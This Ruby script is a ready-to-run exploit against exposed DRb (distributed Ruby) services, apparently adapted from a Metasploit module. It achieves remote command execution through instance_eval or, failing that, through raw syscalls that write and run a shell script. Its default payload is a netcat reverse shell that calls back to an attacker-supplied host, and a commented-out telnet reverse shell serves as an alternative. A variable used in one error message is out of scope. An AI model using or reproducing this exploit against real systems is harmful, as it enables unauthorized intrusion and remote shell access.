require 'drb/drb'
require 'ostruct'

class DRbExploit
  def initialize(host, port)
    @uri = "druby://#{host}:#{port}"
  end

  def exploit(payload)
    begin
      puts payload.encoded
      DRb.start_service
      p = DRbObject.new_with_uri(@uri)
      class << p
        undef :send
      end
      
      puts 'Trying to exploit instance_eval'
      p.send(:instance_eval, "Kernel.fork { `#{payload.encoded}` }")
    rescue SecurityError => e
      puts "Instance eval failed! Trying to exploit syscall.. Hope you are listening on port #{lport}"
      filename = "." + rand_text_alphanumeric(16)
      begin
        j = p.send(:syscall, 20)
        i = p.send(:syscall, 8, filename, 0700)
        p.send(:syscall, 4, i, "#!/bin/sh\n#{payload.encoded}", payload.encoded.length + 10)
        p.send(:syscall, 6, i)
        p.send(:syscall, 2)
        p.send(:syscall, 11, filename, 0, 0)
      rescue SecurityError => e
        puts 'Target is not vulnerable'
      rescue => e
        i = p.send(:syscall, 85, filename, 0700)
        p.send(:syscall, 1, i, "#!/bin/sh\n#{payload.encoded}", payload.encoded.length + 10)
        p.send(:syscall, 3, i)
        p.send(:syscall, 57)
        p.send(:syscall, 59, filename, 0, 0)
      end
    ensure
      DRb.stop_service
    end
    puts "Payload executed from file #{filename}!" unless filename.nil?
    #puts 'Make sure to remove that file' unless filename.nil?
  end

  private

  def rand_text_alphanumeric(length)
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    Array.new(length) { chars[rand(chars.length)].chr }.join
  end
end

# Extract host and port from command line arguments
host = ARGV[0]
port = ARGV[1]

# LHOST and LPORT for payload
lhost = ARGV[2]
lport = ARGV[3] || '4444'

# Check if host and port are provided
if host.nil? || port.nil? || lhost.nil? || lport.nil?
  puts "Usage: ruby exploit.rb <host> <port> <lhost> (<lport> or 4444)"
  exit
end

# Example payload
payload = OpenStruct.new(encoded: "mkfifo /tmp/gythfa; nc #{lhost} #{lport} 0</tmp/gythfa | /bin/sh >/tmp/gythfa 2>&1; rm /tmp/gythfa")
#payload/cmd/unix/reverse
#payload = OpenStruct.new(encoded: "sh -c '(sleep 4595|telnet #{lhost} #{lport}|while : ; do sh && break; done 2>&1|telnet #{lhost} #{lport} >/dev/null 2>&1 &)'")


# Create exploit object with provided host and port
exploit = DRbExploit.new(host, port)
exploit.exploit(payload)
